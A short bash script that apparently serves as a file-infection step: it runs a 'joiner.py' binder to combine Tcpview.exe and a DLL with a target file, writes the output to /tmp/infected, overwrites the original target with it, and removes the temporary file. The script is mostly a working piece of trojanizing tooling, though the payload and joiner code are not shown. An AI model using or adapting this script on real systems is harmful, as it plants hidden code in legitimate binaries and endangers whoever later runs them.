#!/bin/bash
#

./joiner.py -m /tmp/Tcpview.exe -p test.dll -r $1 -s orig.dll -o /tmp/infected
cat /tmp/infected > $1
rm -f /tmp/infected


